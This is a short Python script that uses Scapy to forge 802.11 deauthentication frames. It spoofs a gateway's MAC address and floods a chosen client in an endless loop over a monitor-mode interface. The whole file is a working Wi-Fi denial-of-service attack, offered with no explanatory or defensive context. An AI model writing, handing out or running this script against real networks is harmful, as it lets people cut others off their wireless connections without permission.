# deauth_attack.py
from scapy.all import *

target_mac = "AA:BB:CC:DD:EE:FF"
gateway_mac = "11:22:33:44:55:66"
iface = "wlan0mon"

packet = RadioTap()/Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)/Dot11Deauth(reason=7)

print("[*] Sending deauth packets... Press CTRL+C to stop.")
while True:
    sendp(packet, iface=iface, count=5, inter=0.1, verbose=False)
